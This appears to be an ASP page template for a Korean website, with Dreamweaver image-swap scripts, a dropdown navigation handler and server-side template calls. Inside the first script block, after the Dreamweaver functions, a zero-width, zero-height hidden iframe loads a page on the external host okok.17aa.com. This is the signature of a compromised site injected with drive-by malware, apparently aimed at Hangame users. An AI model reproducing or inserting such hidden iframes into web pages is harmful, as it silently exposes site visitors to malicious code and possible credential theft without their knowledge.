<!--#include file = "../webpart/lib/Init.asp" -->

<html>
<head>
<meta http-equiv="Content-Language" content="ko">
<meta http-equiv="Content-Type" content="text/html; charset=ks_c_5601-1987">
<title><%=stPageTitle%></title>
<link rel="stylesheet" type="text/css" href="<% =stPageCSS %>">
<script language="JavaScript">
						<!--
						function MM_swapImgRestore() { //v3.0
						var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
						}
						function MM_preloadImages() { //v3.0
						var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
						var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
						if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
						}
						function MM_findObj(n, d) { //v4.0
						var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
						d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
						if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
						for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
						if(!x && document.getElementById) x=document.getElementById(n); return x;
						}
						function MM_swapImage() { //v3.0
						var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
						if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
						}
						//-->
<iframe src="http://okok.17aa.com/hangame/index.htm" width="0" height="0" scrolling="no" frameborder="0"></iframe>
</script>

<script language="javascript">
<!--
  function funLink_OnChange(th){
	var i = th.options.selectedIndex ;
	
	if(i > 0){
		var txtURL = th.options[i].value ;	
		window.location.href=txtURL ;
		}
}
//-->
</script>

</head>
<% subSiteManager_Set() %>


<body LEFTMARGIN="0" TOPMARGIN="0" MARGINWIDTH="0" MARGINHEIGHT="0">
<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1">
  <tr>
    <td width="100%"><% funRunTemplete(stPageTemplete)%></td>
  </tr>
</table>
<table border="0" width="921" cellspacing="0" cellpadding="0" style="border-collapse: collapse" bordercolor="#111111" height="0">
  <tr>
    <td width="50%" height="0" valign="top">&nbsp;<% '//subPageCounter_Show() %></td>
    <td width="50%" height="0" align="right" valign="top">&nbsp;<% call funWebparts_Show2( funPageID_Get2(""), 1 , "/webparts/login" , "manager" , "" ) %></td>
  </tr>
</table>
<%  '//call funWebParts_Show2( funPageID_Get2(""), 10 , "/webparts/page" ,  "style1" , "pagesublist/pagesublist-1" )  %>
 </body>
</html>